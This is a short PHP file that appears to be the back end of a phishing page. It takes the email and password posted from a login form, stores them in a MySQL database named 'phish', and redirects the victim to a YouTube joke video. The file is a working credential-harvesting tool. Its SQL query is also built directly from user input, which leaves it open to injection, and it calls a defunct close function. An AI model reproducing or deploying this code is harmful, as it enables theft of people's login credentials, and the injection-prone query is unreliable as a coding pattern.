<!DOCTYPE html>
<html>
<head>
	<title>DATA</title>
</head>
<body>

<?php 

$EMAIL=$_POST['email'];
$PASSWORD=$_POST['pass'];

$link = mysqli_connect("localhost", "root", "", "phish");

if($link === false){
	die("ERROR: Could not connect.".mysqli_connect_error());
}

$sql = "INSERT INTO data (username, password) VALUES ('$EMAIL', '$PASSWORD')";

if(mysqli_query($link, $sql)){
	header("Location:https://www.youtube.com/watch?v=dQw4w9WgXcQ");
	exit();
} else{
	echo "ERROR: COuld not be able to execute $sql.".mysqli_error($link);
}

mysql_close($link);

 ?>

</body>
</html>